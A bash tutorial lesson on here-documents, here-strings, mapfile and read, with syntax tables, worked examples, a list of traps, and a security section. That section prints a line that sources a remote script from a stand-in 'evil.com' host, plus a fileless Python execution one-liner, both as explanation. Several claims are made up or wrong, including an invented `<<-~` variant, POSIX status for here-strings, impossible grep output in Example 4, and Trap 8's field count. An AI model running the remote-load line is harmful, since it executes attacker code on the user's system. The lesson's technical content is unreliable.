# Lesson 10: Here-docs, Here-strings & mapfile

## History & Origins

Here-documents (heredocs) trace back to the **Thompson shell** (1971) and were formalized in the **Bourne shell** (1977). The idea: instead of creating a temporary file and feeding it to a command, let the script carry multi-line text inline, delimited by a user-chosen marker. This was revolutionary — scripts could now embed configs, SQL, HTML, or email bodies without external file dependencies.

Here-strings (`<<<`) arrived much later, introduced in **bash 2.05b** (2002) and formalized in POSIX in the 2016 edition. They're a streamlined version of heredocs for single-line strings. The triple-`<` is a mnemonic for "here-STRING" — the third arrow points to a string instead of a delimiter block.

`mapfile` (also called `readarray`) was introduced in **bash 4.0** (2009). Before `mapfile`, reading a file into an array required clunky `while read` loops that were slow and error-prone. `mapfile` wraps an optimized C-level read loop that's 10-100x faster than a pure-bash `while read` for large files.

The naming is intuitive: "Here document" = "document goes here, right inline." "Here-string" = "string goes here." "mapfile" = "map a file into an array."

## Syntax Reference

### Here-documents

```
<<[-]WORD
    here-document
...
WORD
```

| Variant | Behaviour |
|---------|-----------|
| `<<EOF` | Unquoted delimiter — all `$variables`, `$(commands)`, and `` `backticks` `` are expanded |
| `<<'EOF'` | Quoted delimiter (single or double quotes) — literal text, no expansion |
| `<<\EOF` | Backslash-escaped delimiter — same as quoted, no expansion |
| `<<"EOF"` | Double-quoted delimiter — same as `<<'EOF'`, no expansion |
| `<<-EOF` | Tab-stripping mode — leading tabs are removed from each line (not spaces) |
| `<<-~EOF` | Tab-stripping with leading tabs on the closing delimiter too |

**Edge cases:**
- The closing delimiter **must** be on its own line with no trailing whitespace (unless using `<<-`)
- Variables inside `<<EOF` are expanded at definition time, NOT at execution time of any deferred execution
- Nested heredocs: bash distinguishes delimiters by their literal string — you can nest as long as each closing delimiter appears in order
- The delimiter can be any single word — `EOF`, `END`, `STOP`, `HEREDOC`, `---`, etc.
- If no word follows `<<`, bash expects a quoted delimiter
- EOF/end marker matching is exact — `EOF` and `eof` are different

### Here-strings

```
<<<"word"
<<< word
```

| Variant | Behaviour |
|---------|-----------|
| `<<<"word"` | Quotes are optional; word is expanded as a single string |
| `<<< "a b c"` | Trailing newline is **automatically appended** |
| `<<< $'escape\nsequences'` | ANSI-C quoting works |

**Edge cases:**
- A here-string always appends a single newline to the string
- To suppress the trailing newline: `printf '%s' "data" | command` (but this forks)
- Multiple words without quotes: `<<< hello world` passes only `hello` plus a newline
- Empty here-string: `<<<""` passes just a newline
- `x=""; command <<<"$x"` passes a newline even when `$x` is empty

### mapfile / readarray

**`mapfile`** and **`readarray`** are synonymous — `readarray` was added later for readability.

```
mapfile [-d delim] [-n count] [-O origin] [-s count] [-t] [-u fd] array_var
```

| Option | Behaviour |
|--------|-----------|
| `-t` | Strip trailing newlines from each line (most common) |
| `-d delim` | Use `delim` instead of newline as line delimiter (bash 4.4+) |
| `-n count` | Read at most `count` lines |
| `-O origin` | Start filling array at index `origin` (default 0) |
| `-s count` | Skip `count` lines before starting to read |
| `-u fd` | Read from file descriptor `fd` instead of stdin |
| `-C callback` | Call `callback` every `-c quantum` lines |
| `-c quantum` | Quantum for `-C` callback |

**Edge cases:**
- Without `-t`, each element includes the trailing newline
- `mapfile` on an empty file creates an empty array (not an array with one empty element)
- With `-d ''` (null delimiter), you can read null-separated data safely
- `mapfile` returns 0 unless it can't open the file descriptor
- The array is **overwritten**, not appended to — use `-O` to append

### read (companion)

Since `mapfile` is often paired with `read` for per-line splitting:

```
read [-r] [-a array] [-d delim] [-p prompt] [-t timeout] [-n nchars] [-N nchars] [-s] var...
```

| Flag | Meaning |
|------|---------|
| `-r` | Raw mode — backslashes are not escape chars |
| `-a array` | Split into array instead of scalar variables |
| `-d delim` | Read until `delim` instead of newline |
| `-p prompt` | Display prompt on stderr (no newline) |
| `-t timeout` | Time out after `timeout` seconds |
| `-n nchars` | Read exactly `nchars` characters |
| `-N nchars` | Read exactly `nchars` chars, no delimiter needed |
| `-s` | Silent mode (no echo, for passwords) |

## Under the Hood

### OS/kernel mechanisms

**Here-documents** are implemented via **temporary files** (historically) or **pipes** (modern bash):
1. Bash opens a pipe or temp file
2. Writes the heredoc content to the write end
3. Feeds the read end as stdin to the command
4. On most systems, bash uses `pipe(2)` syscall to create an anonymous pipe
5. The pipe buffer (typically 64KB on Linux) can fill up — bash then writes into a temp file via `mkstemp(3)`

**Here-strings** work similarly but use a **memory-based pipe** or a **temporary file** with just the string content. There's no subshell fork involved in the here-string itself — just the pipe creation.

**mapfile** reads file content using `read(2)` syscalls in a loop, splitting on newlines (or custom delimiter) at the C level. This is why it's faster than a bash `while read` loop — there's no per-iteration interpreter overhead.

### strace reveals

When you run `cat <<< "hello"`:
```
pipe([3, 4])                          = 0
write(4, "hello\n", 6)                = 6
close(4)                              = 0
clone(child_stack=NULL, ...)          = PID   (for cat)
[...]
dup2(3, 0)                            = 0    (pipe becomes stdin)
close(3)                              = 0
execve("/bin/cat", ["cat"], ...)      = 0
read(0, "hello\n", 131072)           = 6
write(1, "hello\n", 6)               = 6
```

No temp file — just a pipe. That's the efficiency win.

### Process implications

- Heredocs do **not** create a subshell by themselves
- The command receiving the heredoc may fork (e.g., `cat` forks), but the heredoc mechanism itself stays in the main shell
- `mapfile` runs entirely in the current shell — no fork
- Pipe-based heredocs block if the pipe buffer fills (reader slower than writer)

### Memory/performance model

- Small heredocs/here-strings: fully buffered in pipe's kernel buffer (~64KB)
- Large heredocs (> pipe capacity): bash spills to a temp file (`/tmp/`), which involves disk I/O
- `mapfile` allocates array memory proportional to file size — a 1GB file in `mapfile` means 1GB in bash memory. For huge files, `while read` with streaming may be better despite being slower per line
- `read -a` on a large line can cause excessive memory allocation

## Core Examples (8-12 minimum)

### Example 1: Multi-line message with variable expansion

**Command:**
```bash
name="Kali"
os="Linux"
cat << EOF
Welcome to $name $os!
Today is $(date +%A).
Your home is $HOME.
EOF
```

**Input:** Script context with `name=Kali`, `os=Linux`

**Output:**
```
Welcome to Kali Linux!
Today is Thursday.
Your home is /home/phd.
```

**Step-by-step:**
1. Bash sees `<< EOF` — unquoted delimiter, expansion enabled
2. Bash replaces `$name` → `Kali`, `$os` → `Linux`, `$(date +%A)` → `Thursday`, `$HOME` → `/home/phd`
3. The expanded text is piped to `cat`'s stdin
4. `cat` writes it to stdout

**Variations:**
- Use `cat << EOF > file` to write directly to a file
- Use `cat << EOF >> file` to append
- Use `cmd << EOF` where `cmd` is anything that reads stdin

### Example 2: Literal heredoc (no expansion)

**Command:**
```bash
cat << 'EOF'
The variable $HOME is not expanded.
The date $(date) stays literal.
Backticks \` also pass through.
EOF
```

**Output:**
```
The variable $HOME is not expanded.
The date $(date) stays literal.
Backticks \` also pass through.
```

**Step-by-step:**
1. `'EOF'` is quoted — bash treats the entire heredoc as a literal string
2. No parameter expansion, command substitution, or arithmetic expansion occurs
3. Even backslash sequences are literal (unlike double-quoted strings)

**Variations:**
- `<< "EOF"` — double quotes also prevent expansion
- `<< \EOF` — backslash-escaped delimiter also prevents expansion
- Use this for writing code templates, configuration files, or scripts from scripts

### Example 3: Heredoc with tab stripping

**Command:**
```bash
if true; then
    cat <<- EOF
	Line one (tab-indented)
	Line two (tab-indented)
	EOF
fi
```

**Output:**
```
Line one (tab-indented)
Line two (tab-indented)
```

**Step-by-step:**
1. `<<-` tells bash to strip leading **tab** characters (not spaces) from each line
2. The leading tabs on `Line one` and `Line two` are removed before piping to `cat`
3. The closing `EOF` must also be tab-indented (or at the start of the line)
4. This is the only way to cleanly indent heredocs inside `if`, `for`, `while`, etc.

**Variations:**
- Only TABS are stripped — spaces are not. Mixing tabs and spaces breaks this
- `<<-EOF` works with/without quoting: `<<-'EOF'` strips tabs AND prevents expansion

### Example 4: Here-string basics

**Command:**
```bash
grep -o '[a-z]*' <<< "Hello World from Bash"
```

**Output:**
```
Hello
World
from
Bash
```

**Step-by-step:**
1. `<<< "Hello World from Bash"` feeds the string to `grep`'s stdin
2. A trailing newline is **automatically appended** by bash
3. `grep -o` outputs only the matched portion of each line
4. `[a-z]*` matches each word as a sequence of lowercase letters

**Variations:**
- `md5sum <<< "string"` — note the newline is included, so `echo -n "string" | md5sum` gives a different hash
- `bc <<< "2+2"` — feed arithmetic to `bc` without `echo`
- `read -r line <<< "single line"` — load a here-string into a variable

### Example 5: mapfile into array

**Command:**
```bash
mapfile -t lines < /etc/hosts
echo "Read ${#lines[@]} lines"
printf '%s\n' "${lines[@]:0:3}"
```

**Input:** `/etc/hosts` has content like:
```
127.0.0.1   localhost
127.0.1.1   myhost
::1         ip6-localhost ip6-loopback
```

**Output:**
```
Read 3 lines
127.0.0.1   localhost
127.0.1.1   myhost
::1         ip6-localhost ip6-loopback
```

**Step-by-step:**
1. `mapfile -t lines < /etc/hosts` — opens `/etc/hosts`, reads each line, strips `\n` via `-t`, stores in array `lines`
2. `${#lines[@]}` gives the array length
3. `${lines[@]:0:3}` slices the first 3 elements

**Variations:**
- `mapfile -t arr < <(command)` — read output of a command
- `mapfile -t -n 10 arr < file` — read only first 10 lines
- `mapfile -t -s 1 arr < file` — skip the first line (header skip)

### Example 6: read with IFS and array splitting

**Command:**
```bash
line="apple,banana,cherry,dragon fruit"
IFS=',' read -ra fields <<< "$line"
echo "First:  ${fields[0]}"
echo "Second: ${fields[1]}"
echo "Third:  ${fields[2]}"
echo "Fourth: ${fields[3]}"
```

**Output:**
```
First:  apple
Second: banana
Third:  cherry
Fourth: dragon fruit
```

**Step-by-step:**
1. `IFS=','` — temporarily sets the Internal Field Separator to comma
2. `read -ra fields` — `-r` for raw, `-a fields` to split into array
3. `<<< "$line"` — feeds the line as stdin to `read`
4. `read` splits the string on commas, assigning each piece to `fields[0]`, `fields[1]`, etc.

**Variations:**
- `IFS=$'\t' read -ra fields` — tab-separated values
- `IFS='|' read -ra fields` — pipe-separated
- Multiple delimiters: `IFS=',;'` splits on comma OR semicolon

### Example 7: Heredoc as stdin to ssh

**Command:**
```bash
ssh user@host << 'REMOTE'
  hostname
  whoami
  df -h /
REMOTE
```

**Output:**
```
remote-host
user
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       100G   50G   50G  50% /
```

**Step-by-step:**
1. `ssh` reads commands from stdin
2. The heredoc is quoted (`'REMOTE'`) so local expansion doesn't happen
3. The commands execute on the remote host
4. Output comes back over the SSH connection

**Variations:**
- Unquoted delimiter to expand local variables: `<< EOF` lets `$LOCAL_VAR` expand before sending
- Use `<<-` to indent commands for readability

### Example 8: Heredoc to variable (instead of file)

**Command:**
```bash
sql=$(cat <<-SQL
  SELECT id, name, email
  FROM users
  WHERE active = 1
  ORDER BY name;
SQL
)
echo "$sql"
```

**Output:**
```
SELECT id, name, email
FROM users
WHERE active = 1
ORDER BY name;
```

**Step-by-step:**
1. `$(cat <<-SQL ... SQL)` — command substitution captures `cat`'s output
2. `cat` reads the heredoc from stdin and writes to stdout
3. `$()` captures that stdout into variable `sql`
4. Tab stripping (`<<-`) keeps the script clean

**Variations:**
- Direct: `read -r -d '' sql <<-SQL` avoids the `cat` fork
- `mapfile` to build multi-line strings line by line

### Example 9: Process substitution with here-string

**Command:**
```bash
diff <(echo "hello") <(echo "world")
```

**Output:**
```
1c1
< hello
---
> world
```

**Step-by-step:**
1. `<(echo "hello")` creates a named pipe (FIFO) whose content is `"hello\n"`
2. Same for `"world"`
3. `diff` reads both FIFOs as "files"
4. Compares and shows the difference

**Variations:**
- `diff <(cmd1) <(cmd2)` — compare outputs of two commands
- `vimdiff <(cmd1) <(cmd2)` — visual comparison
- `grep -f <(pattern_generator) data.txt` — dynamic pattern file

### Example 10: mapfile with custom delimiter

**Command:**
```bash
data="one:two:three:four:five"
mapfile -t -d ':' arr <<< "$data"
echo "${arr[2]}"    # index 2
echo "${#arr[@]}"   # count
```

**Output:**
```
three
5
```

**Step-by-step:**
1. `-d ':'` tells `mapfile` to use `:` as the delimiter instead of newline
2. The string `"one:two:three:four:five"` is split into 5 elements
3. Each element has trailing newline stripped by `-t`

**Variations:**
- `mapfile -d ''` — null-delimited (useful for `find -print0`)
- `mapfile -d $'\t'` — tab-delimited

### Example 11: Template engine with heredoc

**Command:**
```bash
app_name="WebApp"
version="2.1.0"
port=8080

cat <<-TEMPLATE > /tmp/deploy.conf
  application: ${app_name}
  version: ${version:-latest}
  server: {
    listen: ${port:-80}
    root: /var/www/${app_name}
  }
TEMPLATE
```

**Output file (`/tmp/deploy.conf`):**
```
application: WebApp
version: 2.1.0
server: {
  listen: 8080
  root: /var/www/WebApp
}
```

**Step-by-step:**
1. All variables expand inside the unquoted heredoc
2. `${port:-80}` provides a default of 80 if `$port` is unset
3. The output is redirected to `/tmp/deploy.conf` via `>`
4. Tab stripping keeps the inline script clean

### Example 12: Here-string with bc for arithmetic

**Command:**
```bash
bc <<< "scale=6; 355/113"
```

**Output:**
```
3.141592
```

**Step-by-step:**
1. `bc` reads stdin — the string `"scale=6; 355/113\n"`
2. `bc` sets scale to 6 and computes 355/113
3. Result approximates pi to 6 decimal places

**Variations:**
- `bc <<< "obase=16; 255"` → `FF` (decimal to hex)
- `bc -l <<< "s(3.14159/4)"` — sine function with `-l` library

## Real-World Use Cases

### FOR the OS

- **Configuration generation**: Apache/Nginx config files, ini files, YAML snippets from templates
- **SQL script execution**: Embed SQL in deployment scripts
- **Email bodies**: `mail -s "Alert" user@host << EOF ... EOF`
- **SSH command bundles**: Send multiple commands to remote hosts in a single connection
- **Systemd unit creation**: Write service files programmatically
- **HTML report generation**: Build status dashboards with heredocs
- **Dockerfile generation**: Create Dockerfiles dynamically based on environment

### WITH the OS

- **`mapfile` for log parsing**: Read syslog, auth.log, or any line-oriented log into arrays for processing
- **`read -a` with here-strings**: Parse `/proc/` files, `/etc/fstab`, CSV exports
- **Config sourcing**: Read `key=value` files with `mapfile` then `declare` each variable
- **Batch account creation**: `newusers <<< "$(cat userlist.txt)"` — feed formatted data to system tools

### AGAINST the OS (Security Perspective)

- **Heredoc injection via unquoted delimiters**: If an attacker can control part of a heredoc (e.g., a variable used inside `<<EOF`), they can inject commands with `$(malicious_command)`. This is a classic code injection vector.
- **Here-string to bypass input validation**: Tools like `chsh`, `passwd`, or `sudo` read from `/dev/tty` not stdin, so heredocs won't work — but `ssh` and other tools are fair game for injection.
- **`mapfile` + FIFO race**: If the input to `mapfile` is from a named pipe an attacker controls, they can feed crafted data.
- **Fileless execution with heredocs**: `python3 <<< "import os; os.system('id')"` — runs code without ever writing a file, bypassing filesystem-based detection.
- **`source <(curl -s http://evil.com/payload.sh)`** — process substitution with here-string-like behavior to load remote code into the current shell.
- **Environment variable leakage via heredocs**: Logging heredoc content that includes `$AWS_SECRET_KEY` or `$DB_PASSWORD` can leak credentials into logs.

### FOR DEFENSE

- **Always quote heredoc delimiters when processing untrusted data**: `<< 'EOF'` prevents expansion of injected variable references
- **Validate any content before including it in a heredoc**: Scan for `$(`, backticks, and `${` patterns
- **Use `read -r` to prevent backslash interpretation** when reading attacker-controlled input
- **`mapfile` size limits**: Don't blindly `mapfile` user uploads — set `-n` to limit lines
- **Prefer `printf '%s' "$var"` over heredocs containing sensitive variables** to avoid accidental expansion
- **For cryptographic operations, avoid `$RANDOM` in here-strings** — predictable seed

## Memory Aids

- **`<<`** = two arrows pointing into the command = "data flows this way INTO stdin"
- **`<<<`** = three arrows = "here-STRING" (three arrows = string, more pointed than a doc)
- **`EOF`** = "End Of File" — the most common delimiter, but it can be any word
- **`mapfile`** literally "map a file into an array" — like a memory map
- **Quote delimiters** when you want "StOp ExPaNsIoN" — `'EOF'` means "Expansion? OH Forget it"
- **`<<-`** = the dash looks like it's cutting off tabs (it does!)
- **`IFS=',' read -ra`** — IFS = "I Found Separators" — it's the multi-tool for splitting

## Trap Vault (8-12 traps)

### Trap 1: Heredoc variable expansion when you wanted literal text

**Problem:** Your heredoc contains `$variable` references that you want to pass literally to a file, but bash expands them.

**Bad Example:**
```bash
cat << EOF > script.sh
#!/bin/bash
echo "User: $USER"
EOF
```

**Root Cause:** `<< EOF` (unquoted) expands `$USER` to the current user at heredoc creation time.

**Fix:**
```bash
cat << 'EOF' > script.sh
#!/bin/bash
echo "User: $USER"
EOF
```

### Trap 2: here-string includes trailing newline

**Problem:** `md5sum <<< "hello"` gives a different hash than `printf 'hello' | md5sum`.

**Bad Example:**
```bash
expected=$(printf 'hello' | md5sum)
got=$(md5sum <<< "hello")
[[ "$expected" == "$got" ]] && echo "match"  # false!
```

**Root Cause:** `<<<` always appends `\n`. So `md5sum` hashes `"hello\n"` not `"hello"`.

**Fix:**
```bash
got=$(printf '%s' "hello" | md5sum)
# or
got=$(echo -n "hello" | md5sum)  # echo -n = no newline
```

### Trap 3: read in a pipe loses variable

**Problem:** After `echo "$data" | read var`, `$var` is empty.

**Bad Example:**
```bash
echo "hello world" | read first rest
echo "First: $first"  # empty!
```

**Root Cause:** Pipelines create subshells in bash. `read` runs in a subshell, the variable is set there, then the subshell exits.

**Fix:**
```bash
read first rest <<< "hello world"
# or
read first rest < <(echo "hello world")
```

### Trap 4: mapfile without -t preserves newlines

**Problem:** Elements printed with extra blank lines.

**Bad Example:**
```bash
mapfile arr < file
printf 'Line: "%s"\n' "${arr[0]}"  # prints "Line: "content"\n"
```

**Root Cause:** Without `-t`, each element retains its trailing newline.

**Fix:** `mapfile -t arr < file`

### Trap 5: Closing delimiter has trailing whitespace

**Problem:** Heredoc doesn't terminate.

**Bad Example:**
```bash
cat << EOF
content
EOF   ← has a trailing space
```

**Root Cause:** The closing delimiter must be exactly `EOF` — no trailing whitespace, no leading whitespace (unless using `<<-`).

**Fix:** Remove trailing whitespace, or use `<<-` and tab-indent.

### Trap 6: Heredoc inside command substitution

**Problem:** Getting syntax errors with heredocs inside `$()`.

**Bad Example:**
```bash
result=$(cat << EOF
some data
EOF
)
```
This actually works, but people get confused and try:
```bash
result=$(cat << EOF
some data
)
```

**Root Cause:** The closing delimiter (`EOF`) and the `)` interact if misplaced. The `EOF` must come BEFORE the closing `)`.

**Fix:** Put `EOF` on its own line before `)`.

### Trap 7: mapfile with process substitution hangs

**Problem:** `mapfile -t arr < <(ssh host 'tail -f /var/log/syslog')` never finishes.

**Root Cause:** `tail -f` never terminates, so the FIFO never closes, so `mapfile` keeps reading.

**Fix:** Use a command that terminates: `tail -n 100` instead of `tail -f`.

### Trap 8: read -a split on IFS but here-string doesn't preserve empty fields

**Problem:**
```bash
line="apple,,cherry"
IFS=',' read -ra fields <<< "$line"
echo "${#fields[@]}"  # prints 2, not 3
```

**Root Cause:** By default, `read` trims leading/trailing IFS whitespace and treats consecutive IFS characters as one delimiter.

**Fix:**
```bash
IFS=',' read -ra fields <<< "$line"
# For empty fields, set IFS to empty temporarily and use a different approach
# Or use mapfile -d with a delimiter
```

### Trap 9: Here-string to ssh doesn't allocate tty

**Problem:** `ssh host <<< "command"` fails with "Pseudo-terminal will not be allocated."

**Root Cause:** SSH needs a TTY for interactive sessions; here-strings/heredocs provide stdin but no TTY.

**Fix:** `ssh -t host <<< "command"` or `ssh host 'command'`

### Trap 10: heredoc with `sudo` prompting for password

**Problem:** `sudo cat << EOF > /etc/protected/file` fails with permission denied.

**Root Cause:** I/O redirection is handled by the **shell**, not by `sudo`. The `> /etc/protected/file` is opened by the current shell before `sudo cat` runs.

**Fix:**
```bash
sudo bash -c 'cat << EOF > /etc/protected/file
content
EOF'
# or
cat << EOF | sudo tee /etc/protected/file > /dev/null
content
EOF
```

### Trap 11: mapfile silently truncates on binary content

**Problem:** `mapfile -t arr < binary.file` gives mangled data.

**Root Cause:** `mapfile` reads text — it splits on newlines. Binary files may contain null bytes, stray newlines, or other content that corrupts the array.

**Fix:** Don't use `mapfile` for binary data. Use `xxd`, `base64`, or `dd` instead.

### Trap 12: Indentation with spaces masked as tabs

**Problem:** `<<-` doesn't strip the "tabs" you carefully added with spaces.

**Bad Example:**
```bash
if true; then
    cat <<- EOF
    content    ← spaces, not tabs
    EOF
fi
```

**Root Cause:** `<<-` strips only **tab** characters (0x09), not spaces (0x20).

**Fix:** Use actual tabs, or use `sed 's/^[[:space:]]*//'` on a regular heredoc.

## See It In The Wild

Where you encounter these every day:

- **`/etc/rc.local`**, **init scripts**, **systemd unit generators** all use heredocs for config injection
- **Dockerfiles** use heredocs for multi-line RUN commands (Docker 18.09+)
- **`git` hooks** often use heredocs to write temporary scripts
- **`/etc/security/pam_env.conf`** parsers use `read -a` with here-strings
- **Ansible/CHEF/Puppet modules** that generate config files on-the-fly use heredocs

**Try this now:**

1. `strace -e trace=write,pipe cat <<< "test" 2>&1 | head -20` — watch the pipe creation
2. `time bash -c 'mapfile -t arr < /etc/hosts'` vs `bash -c 'while IFS= read -r line; do arr+=("$line"); done < /etc/hosts'` — see the speed difference
3. `read -t 3 -p "Quick: " val <<< "auto" && echo "$val"` — auto-feed a read with a here-string
4. `diff -u <(ls /tmp) <(ls /var/tmp)` — compare directory contents without temp files

## Check Your Understanding (5-7 questions)

1. What's the exact output of `cat <<< "Hello\nWorld"`? (Hint: does `\n` expand?)
2. Why does `read var <<< "$(echo 'hello')"` work but `echo 'hello' | read var` doesn't preserve `$var`?
3. How would you read the last 10 lines of a file into an array using `mapfile`? (Needs two commands or `tail` + `mapfile`)
4. What happens if you forget the `-t` flag on `mapfile` — what gets stored in each array element?
5. When would you choose `while IFS= read -r line` over `mapfile` despite it being slower?
6. What's the memory implication of `mapfile -t big_array < /var/log/syslog` if syslog is 2GB?
7. How do you feed a here-string to `sudo` without a TTY allocation problem?

---
*"A heredoc is just a temporary file that never knew it was temporary." — Ancient Bash Proverb*
